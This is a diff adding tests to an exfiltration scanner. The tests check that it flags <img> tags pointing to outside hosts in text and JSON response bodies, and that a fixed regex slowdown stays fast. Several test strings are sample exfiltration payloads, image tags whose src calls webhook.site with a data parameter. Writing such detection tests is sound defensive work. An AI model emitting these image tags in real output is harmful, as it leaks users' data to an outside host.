@@ -120,6 +120,44 @@ describe('scanResponseExfil', () => {
   it('handles empty input', () => {
     expect(scanResponseExfil('', isExfil)).toHaveLength(0)
   })
+
+  // GHSA-983r-9gmc-f3xr: the <img> pattern's lazy attribute scan restarted at
+  // every `<img` and ran to the end of the text when no URL followed, so 400 KB
+  // of `<img src="` took 10.5 s on the request thread. Each tag is now read once.
+  describe('<img> tags', () => {
+    it('stays linear on 400 KB of unfinished tags, raw and in a JSON body', () => {
+      for (const filler of ['<img src="', '<img ', '<img alt="', '<IMG SRC=', '<img src=x '])  {
+        const text = filler.repeat(Math.ceil(400_000 / filler.length))
+        const started = Date.now()
+        scanResponseExfil(text, isExfil)
+        scanResponseExfil(JSON.stringify({ content: [{ type: 'text', text }] }), isExfil)
+        expect(Date.now() - started, filler).toBeLessThan(500)
+      }
+    })
+
+    it('flags the src of a tag whatever its attributes', () => {
+      for (const text of [
+        '<img src="https://webhook.site/?d=1">',
+        "<img alt='x' src='https://webhook.site/?d=1' />",
+        '<IMG SRC=https://webhook.site/?d=1>',
+        '<img alt=">" src="https://webhook.site/?d=1">',
+        '<img\n  width="1"\n  src="https://webhook.site/?d=1">',
+      ]) expect(scanResponseExfil(text, isExfil).map(f => f.kind), text).toEqual(['html-image'])
+    })
+
+    it('flags it inside a JSON response body, where the quotes are escaped', () => {
+      const body = JSON.stringify({ content: [{ type: 'text', text: 'see <img src="https://webhook.site/?d=1">' }] })
+      const f = scanResponseExfil(body, isExfil)
+      expect(f.map(x => x.url)).toEqual(['https://webhook.site/?d=1'])
+      expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
+    })
+
+    it('reads each tag on its own', () => {
+      expect(scanResponseExfil('<img src="https://cdn.trusted.com/a.png"> text <img src="https://webhook.site/?d=1">', isExfil).map(f => f.url))
+        .toEqual(['https://webhook.site/?d=1'])
+      expect(scanResponseExfil('<img alt="no src here"> then src="https://webhook.site/?d=1"', isExfil)).toEqual([])
+    })
+  })
 })
 
 describe('neutralizeExfil', () => {
